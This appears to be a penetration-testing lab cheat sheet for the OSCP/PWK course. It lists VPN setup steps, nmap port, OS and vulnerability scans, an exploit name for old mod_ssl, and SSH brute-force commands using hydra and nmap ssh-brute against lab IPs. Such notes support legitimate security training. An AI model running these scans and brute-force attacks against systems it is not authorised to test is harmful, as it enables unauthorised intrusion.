#automate VPN

tar xvzf file.tar.gz
echo 'OS-#####' > cred.txt
echo ' #######' >> cred.txt
vi auth-user-pass cred.txt
openvpn OS-####-PWK.ovpn


#nmap scanning
nmap -sU -sV -n --top-ports 200 10.11.1.72  > /root/PWK-Lab/10.11.1.72/nmap-udp
nmap -p 1-65535 -T4 -A -v 192.168.88.171
nmap -sV -sC -oA nmap 192.168.111.172
nmap -vv -Pn -A -sC -sS -T 4 -p- 10.0.0.1
nmap -sT -sV -A -O -v -p 1-65535 192.168.1.30
nmap -p- -sS -A 192.168.88.155

Vuln scan : nmap -sS -sV --script=vulscan/vulscan.nse 10.11.1.44
OS detection : nmap -O -v 10.11.1.5

#SSH
OpenFuck (Apache mod_ssl < 2.8.7 OpenSSL) 764.c 
Bruteforce : 
nmap -p 22 --script ssh-brute --script-args userdb=users.txt,passdb=users.txt --script-args ssh-brute.timeout=4s 192.168.88.152
hydra -l user -P /usr/share/wordlists/rockyou.txt  192.168.88.171 ssh -t 4
ref : 
https://github.com/g0tmi1k/debian-ssh 
https://blog.g0tmi1k.com/2010/04/pwnos/
